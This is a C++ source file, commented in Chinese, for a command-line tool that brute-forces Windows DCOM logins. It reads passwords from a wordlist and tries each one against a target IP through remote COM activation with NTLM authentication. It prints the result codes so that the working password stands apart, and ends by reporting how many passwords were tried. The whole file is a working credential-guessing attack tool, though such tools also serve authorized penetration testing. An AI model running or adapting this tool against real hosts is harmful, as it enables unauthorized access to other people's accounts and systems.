// dcomBreak.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include<string>
#include <initguid.h>
#include <objbase.h>
#include<getopt.h>                
#include <iostream>
#include <fstream>
#include <cassert>
#include "atlconv.h"

using namespace std;

DEFINE_GUID(CLSID_SimpleObject, 0x9BA05972, 0xF6A8, 0x11cf, 0xA4, 0x42 , 0x00, 0xA0, 0xC9, 0x0A, 0x8F, 0x39);
int main(int argc, char *argv[])
{
	char* pszName = nullptr;
	char* filename = nullptr;
	char* ip = nullptr;
	wchar_t wip[20];
	int sum = 0;
	int g = 0;

	int opt;  // getopt() 的返回值
	char *optstring = "u:p:i:gc"; // 设置短参数类型及是否需要参数
	if(argc<2)printf("Usage:\n-u:username\n-p:password file\n-i:target ip\n-g means:RemoteGetClassObject\n-c means:RemoteCreateInstance(default)\n\nFor example:\n%s -u Administrator -p password.txt -i 192.168.1.1\n",argv[0]);
	while ((opt = getopt(argc, argv, optstring)) != -1) {
		if (opt == 'u')
			pszName = optarg;
		if (opt == 'p')
			filename = optarg;
		if (opt == 'i') 
			ip = optarg;
		if (opt == 'g')
			g = 1;
		if (opt == 'c')
			g = 0;
	}


	if (filename == nullptr || pszName==nullptr || ip==nullptr)return -1;

	mbstowcs(wip, ip, strlen(ip) + 1);

	printf("name        :%s\n", pszName);
	printf("passwordFile:%s\n", filename);
	wprintf(L"targetIP    :%s\n", wip);
	if (g) {
		printf("function    :RemoteGetClassObject\n\n");
	}
	else {
		printf("function    :RemoteCreateInstance\n\n");
	}

	ifstream infile;
	infile.open(filename);   //将文件流对象与文件连接起来 
	assert(infile.is_open());   //若失败,则输出错误消息,并终止程序运行 
	
	string s;
	printf("password,response\n");
	while (getline(infile, s)) {
		CoInitialize(NULL);//初始化COM环境
		char* pszDomain = new char[255];
		char* pszPassword = &s[0];
		pszDomain = "";


		COAUTHIDENTITY author_id;			//身份信息
		ZeroMemory(&author_id, sizeof(COAUTHIDENTITY));
		author_id.Flags = SEC_WINNT_AUTH_IDENTITY_ANSI;
		/*
		SEC_WINNT_AUTH_IDENTITY_ANSI
		SEC_WINNT_AUTH_IDENTITY_UNICODE
		*/
		author_id.User = reinterpret_cast<USHORT*>(pszName);
		author_id.UserLength = strlen(pszName);
		author_id.Domain = reinterpret_cast<USHORT*>(pszDomain);
		author_id.DomainLength = strlen(pszDomain);
		author_id.Password = reinterpret_cast<USHORT*>(pszPassword);
		author_id.PasswordLength = strlen(pszPassword);

		COAUTHINFO athn;					//连接方式
		ZeroMemory(&athn, sizeof(COAUTHINFO));
		athn.dwAuthnLevel = RPC_C_AUTHN_LEVEL_CONNECT;
		/*
		RPC_C_AUTHN_LEVEL_DEFAULT 			使用指定身份验证服务的默认身份验证级别。
		RPC_C_AUTHN_LEVEL_NONE 				不执行身份验证。
		RPC_C_AUTHN_LEVEL_CONNECT 			仅在客户端与服务器建立关系时进行身份验证。  默认是这个
		RPC_C_AUTHN_LEVEL_CALL 				仅在服务器收到请求时在每个远程过程调用开始时进行身份验证。不适用于使用基于连接的协议序列（以前缀“ncacn”开头的那些）进行的远程过程调用。如果绑定句柄中的协议序列是基于连接的协议序列，并且您指定了此级别，则此例程将使用RPC_C_AUTHN_LEVEL_PKT常量。
		RPC_C_AUTHN_LEVEL_PKT 				仅验证收到的所有数据来自预期的客户端。不验证数据本身。
		RPC_C_AUTHN_LEVEL_PKT_INTEGRITY 	验证并验证客户端和服务器之间传输的数据均未被修改。
		RPC_C_AUTHN_LEVEL_PKT_PRIVACY 		包括所有以前的级别，并确保发送方和接收方只能看到明文数据。在本地案例中，这涉及使用安全通道。在远程情况下，这涉及加密每个远程过程调用的参数值。
		参考：https://docs.microsoft.com/en-us/windows/win32/rpc/authentication-level-constants
		*/

		athn.dwAuthnSvc = RPC_C_AUTHN_WINNT;
		/*
		RPC_C_AUTHN_NONE				没有身份验证
		RPC_C_AUTHN_DCE_PRIVATE			使用分布式计算环境（DCE）私钥身份验证。
		RPC_C_AUTHN_DCE_PUBLIC			DCE公钥认证（保留供将来使用）。
		RPC_C_AUTHN_DEC_PUBLIC			DEC公钥认证（保留供将来使用）。
		RPC_C_AUTHN_GSS_NEGOTIATE		使用Microsoft Negotiate SSP。此SSP在使用NTLM和Kerberos协议安全支持提供程序（SSP）之间进行协商。
		RPC_C_AUTHN_WINNT				使用Microsoft NT LAN Manager（NTLM）SSP。
		RPC_C_AUTHN_GSS_SCHANNEL		使用Schannel SSP。该SSP支持安全套接字层（SSL），专用通信技术（PCT）和传输级安全性（TLS）。
		RPC_C_AUTHN_GSS_KERBEROS		使用Microsoft Kerberos SSP。
		RPC_C_AUTHN_DPA					使用分布式密码验证（DPA）。
		RPC_C_AUTHN_MSN					用于Microsoft网络（MSN）的身份验证协议SSP。
		RPC_C_AUTHN_DIGEST				Windows XP或更高版本：使用Microsoft摘要SSP			
		RPC_C_AUTHN_NEGO_EXTENDER		Windows 7或更高版本：保留。不使用
		RPC_C_AUTHN_MQ					此SSP为Microsoft消息队列（MSMQ）传输级协议提供SSPI兼容的包装器。
		RPC_C_AUTHN_DEFAULT				使用默认身份验证服务。
		*/
		athn.dwAuthzSvc = RPC_C_AUTHZ_NONE;
		/*
		RPC_C_AUTHZ_NONE			服务器不执行授权。	大多数应用程序发现RPC_C_AUTHZ_NON已足够
		RPC_C_AUTHZ_NAME			服务器根据客户端的主体名称执行授权。
		RPC_C_AUTHZ_DCE				服务器使用客户端的DCE权限属性证书（PAC）信息执行授权检查，该信息通过使用绑定句柄进行的每个远程过程调用发送到服务器。通常，根据DCE访问控制列表（ACL）检查访问。
		RPC_C_AUTHZ_DEFAULT			服务器使用当前SSP的默认授权服务。
		*/
		athn.dwCapabilities = EOAC_NONE;
		athn.dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
		/*
		RPC_C_IMP_LEVEL_DEFAULT					DCOM可以使用其常规安全毯协商算法来选择模拟级别。有关更多信息，请参阅安全毯协商。
		RPC_C_IMP_LEVEL_ANONYMOUS	匿名		客户端对服务器是匿名的。服务器进程可以模拟客户端，但模拟令牌不包含任何信息且无法使用。
		RPC_C_IMP_LEVEL_IDENTIFY	标识		服务器可以获取客户端的身份。服务器可以模拟客户端进行ACL检查，但不能作为客户端访问系统对象。
		RPC_C_IMP_LEVEL_IMPERSONATE	模拟		服务器进程可以在代表客户端执行时模拟客户端的安全上下文。此模拟级别可用于访问本地资源（如文件）。在此级别进行模拟时，模拟令牌只能通过一个机器边界传递。该Schannel中的身份验证服务只支持该级别的模拟的。
		RPC_C_IMP_LEVEL_DELEGATE	委派		服务器进程可以在代表客户端执行时模拟客户端的安全上下文。服务器进程还可以使用隐藏真实内容代表客户端执行向其他服务器的传出呼叫。服务器可以使用其他计算机上的客户端安全上下文来访问作为客户端的本地和远程资源。在此级别进行模拟时，模拟令牌可以通过任意数量的计算机边界传递。
		
		*/

		athn.pAuthIdentityData = &author_id;
		athn.pwszServerPrincName = NULL;

		COSERVERINFO ServerInfo;			//创建服务器信息结构
		ZeroMemory(&ServerInfo, sizeof(COSERVERINFO));
		ServerInfo.pwszName = wip;
		ServerInfo.pAuthInfo = &athn;
		ServerInfo.dwReserved1 = 0;
		ServerInfo.dwReserved2 = 0;

		MULTI_QI MultiQI;
		MultiQI.hr = NOERROR;
		MultiQI.pItf = NULL;
		MultiQI.pIID = &IID_IStream;

		IClassFactory *t_ClassFactory = NULL;
		
		HRESULT hr;
		if (g) {
			hr = CoGetClassObject(
				CLSID_SimpleObject,
				CLSCTX_REMOTE_SERVER,
				&ServerInfo,
				IID_IClassFactory,
				(void **)& t_ClassFactory
			);
		}
		else {
			hr = CoCreateInstanceEx(CLSID_SimpleObject,
				NULL,
				CLSCTX_REMOTE_SERVER,
				&ServerInfo,
				1,
				&MultiQI);
		}
		
		if (hr == 0x80070005 || hr == 0x800706BA) {
			printf("%s,%p          \r", pszPassword, hr);
		}
		else {
			printf("%s,%p          \n", pszPassword, hr);
		}
		CoUninitialize();
		sum += 1;

	}


	printf("\n爆破完成，共尝试%d个密码\n", sum);
	infile.close();             

    return 0;
}

